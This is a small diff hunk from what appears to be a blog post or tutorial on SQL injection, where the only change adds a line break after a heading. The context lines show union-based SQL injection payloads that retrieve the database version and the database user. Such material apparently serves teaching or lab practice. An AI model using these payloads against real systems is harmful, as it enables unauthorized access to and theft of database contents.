@@ -16,7 +16,7 @@ excerpt_separator: <!--more-->
 Display Database Version<br>
 %' or 0=0 union select null, version() #<br>
 <br>
-Display Database User
+Display Database User<br>
 %' or 0=0 union select null, user() #<br>
 <br>
 Display Database Name<br>
